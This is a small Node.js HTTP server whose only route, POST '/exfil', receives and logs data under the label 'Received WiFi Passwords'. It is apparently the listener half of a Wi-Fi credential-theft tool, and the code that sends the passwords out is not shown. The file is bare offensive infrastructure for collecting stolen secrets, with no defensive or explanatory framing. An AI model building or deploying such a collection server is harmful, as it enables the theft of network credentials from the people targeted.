const http = require('http');
const port = 3000;

const requestHandler = (request, response) => {
  if (request.method === 'POST' && request.url === '/exfil') {
    let body = '';
    request.on('data', chunk => {
      body += chunk.toString();
    });
    request.on('end', () => {
      console.log('Received WiFi Passwords:');
      console.log(body);
      response.end('Data received');
    });
  } else {
    response.statusCode = 404;
    response.end('Not Found');
  }
};

const server = http.createServer(requestHandler);

server.listen(port, (err) => {
  if (err) {
    return console.log('Something went wrong:', err);
  }
  console.log(`Server is listening on ${port}`);
});
